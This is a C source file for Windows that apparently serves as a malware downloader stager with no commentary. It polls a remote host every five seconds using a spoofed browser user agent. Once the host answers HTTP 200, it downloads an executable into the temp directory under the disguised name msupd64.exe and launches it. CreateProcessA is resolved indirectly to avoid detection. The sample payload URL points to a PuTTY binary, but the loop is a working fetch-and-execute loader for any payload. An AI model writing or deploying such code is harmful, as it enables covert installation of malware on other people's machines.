#include <Windows.h>
#include <stdio.h>
#include <Winhttp.h>
#include <Shlobj.h>
#include <Urlmon.h>
#include <Shlwapi.h>

#pragma comment(lib, "winhttp")
#pragma comment(lib, "shell32")
#pragma comment(lib, "urlmon")
#pragma comment(lib, "Shlwapi")



typedef BOOL (WINAPI *CREATEPROC)(
  __in_opt     LPCTSTR lpApplicationName,
  __inout_opt  LPTSTR lpCommandLine,
  __in_opt     LPSECURITY_ATTRIBUTES lpProcessAttributes,
  __in_opt     LPSECURITY_ATTRIBUTES lpThreadAttributes,
  __in         BOOL bInheritHandles,
  __in         DWORD dwCreationFlags,
  __in_opt     LPVOID lpEnvironment,
  __in_opt     LPCTSTR lpCurrentDirectory,
  __in         LPSTARTUPINFO lpStartupInfo,
  __out        LPPROCESS_INFORMATION lpProcessInformation
);

int poll();

wchar_t sPollUrl[] = L"the.earth.li";
wchar_t sUserAgent[] = L"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11";

int main()
{
	while(1)
	{
		poll();
		Sleep(5000);
	}
}


int poll()
{
	HINTERNET hSession = WinHttpOpen(sUserAgent,
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS,
		NULL);
	if (!hSession)
		return 0;

	HINTERNET hConnect = WinHttpConnect(hSession,
		sPollUrl,
		INTERNET_DEFAULT_HTTP_PORT,
		0);
	if (!hConnect)
		return 0;

	HINTERNET hRequest = WinHttpOpenRequest(
		hConnect,
		L"GET",
		L"/~sgtatham/putty/latest/x86/putty.exe",
		NULL,
		WINHTTP_NO_REFERER,
		WINHTTP_DEFAULT_ACCEPT_TYPES,
		WINHTTP_FLAG_BYPASS_PROXY_CACHE|WINHTTP_FLAG_REFRESH);
	if (!hRequest)
		return 0;

	BOOL ret = WinHttpSendRequest(hRequest,
		WINHTTP_NO_ADDITIONAL_HEADERS ,
		0,
		NULL,
		0,
		0,
		NULL);
	if (!ret)
		return 0;
	
	ret = WinHttpReceiveResponse(hRequest, NULL);
	if (!ret)
		return 0;
	
	DWORD BuffLen = 20;
	LPVOID HttpStatus = new WCHAR[20];
	ret = WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE, WINHTTP_HEADER_NAME_BY_INDEX, HttpStatus, &BuffLen, WINHTTP_NO_HEADER_INDEX);
	if (!ret)
		return 0;

	if (memcmp(HttpStatus, "\x32\x00\x30\x00\x30", 5))
		return 0;



	LPSTR TmpPath = (LPSTR)malloc(MAX_PATH);
	memset(TmpPath, 0x0, MAX_PATH);
	if (!GetTempPath(MAX_PATH, TmpPath))
		return 0;

	strcat(TmpPath, "\\msupd64.exe");
	URLDownloadToFile(NULL,
		"http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe",
		TmpPath,
		NULL,
		NULL);

	STARTUPINFO sinfo = {0};
	PROCESS_INFORMATION pinfo = {0};

	CREATEPROC fpCreateProcess = (CREATEPROC)GetProcAddress(GetModuleHandle("kernel32"), "CreateProcessA");
	fpCreateProcess(NULL,
		TmpPath,
		NULL,
		NULL,
		FALSE,
		0,
		NULL,
		NULL,
		&sinfo,
		&pinfo);

	ExitProcess(0);

	return 1;
}

